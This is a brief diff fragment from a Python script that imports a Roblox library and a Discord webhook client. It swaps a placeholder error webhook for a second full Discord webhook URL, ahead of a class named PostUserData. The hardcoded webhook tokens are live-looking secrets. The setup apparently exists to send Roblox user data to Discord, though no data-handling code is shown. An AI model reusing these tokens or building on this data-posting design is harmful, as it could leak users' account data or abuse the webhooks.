@@ -7,7 +7,7 @@ import robloxpy
 from discord_webhook import DiscordWebhook
 
 DiscordWebhookURL = "https://discordapp.com/api/webhooks/1346472169302921298/_hqaJkc1G8MTa166luFtNhcmsGpDyEz7URZ21JvbWHnEEY9E3qOKf37i5FFFK00HJGTg"
-DiscordWebhookURL_ERROR = "here error webhooked for handling errors"
+DiscordWebhookURL_ERROR = "https://discordapp.com/api/webhooks/1346634053117415504/47GPYPvQyIsslD2C53swPpnRxkH93ELaG_9W-6BYV-1_csKCfchTDGbTltcTmvqN4WFm"
 
 class PostUserData:
     
